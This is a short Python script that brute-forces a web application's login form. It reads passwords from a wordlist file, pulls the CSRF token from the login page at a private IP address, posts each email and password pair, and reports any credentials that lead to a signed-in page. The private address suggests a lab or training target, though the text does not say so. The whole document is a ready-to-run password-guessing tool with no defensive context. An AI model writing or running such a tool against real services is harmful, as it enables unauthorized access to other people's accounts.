import sys
import requests

def get_csrf_token(res):
    token_index = res.text.find("_token")
    token = res.text[token_index:].split('"')[2]
    return token

def check_creds(s, email, password):
    res = s.get("http://172.16.238.100/login")  
    token = get_csrf_token(res)
    res = s.post("http://172.16.238.100/login", data={
            "_token": token,            
            "email": email,
            "password": password})      

    if("Sign Out" in res.text):
        print("[+] Valid credentials found:", email, password)
        return True
    else:
        return False

def main(email, password_file):
    s = requests.Session()
    with open(password_file) as f:
        for password in f:
            if(check_creds(s, email, password.strip())):
                break

if __name__ == "__main__":
    if(len(sys.argv) != 3):
        print(f"python {sys.argv[0]} <email> <password_file>")
        print(f"python {sys.argv[0]} khalid@omani.cloud passwords.txt")
        sys.exit(0)
    main(sys.argv[1], sys.argv[2])
